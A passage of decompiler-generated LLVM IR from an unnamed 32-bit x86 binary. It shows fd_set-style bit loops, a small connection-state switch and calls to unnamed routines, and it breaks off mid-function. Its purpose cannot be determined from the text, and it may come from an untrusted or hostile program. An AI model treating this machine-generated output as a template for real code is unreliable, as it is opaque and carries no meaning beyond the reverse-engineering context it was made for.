  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_8052398()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_8052452(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp141, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_8052800()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_8052191(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8051c80(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805285e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp142, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054ac4.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8051ca0()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054ac4.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8051ca0()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_80511f0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_8051ee0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
